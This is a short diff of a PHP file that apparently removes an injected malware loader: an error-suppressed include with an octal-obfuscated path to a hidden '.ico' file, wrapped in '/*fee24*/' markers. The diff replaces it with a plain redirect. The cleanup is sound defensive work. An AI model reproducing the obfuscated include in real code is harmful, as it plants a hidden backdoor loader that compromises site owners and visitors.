@@ -1,8 +1,3 @@
 <?php
-/*fee24*/
-
-@include "\057ho\155e/\160m/\160ub\154ic\137ht\155l/\143r/\166en\144or\057je\162em\145am\151a/\05659\067a6\066c7\056ic\157";
-
-/*fee24*/
-
-
+header("Refresh: 0; url=/");
+?>
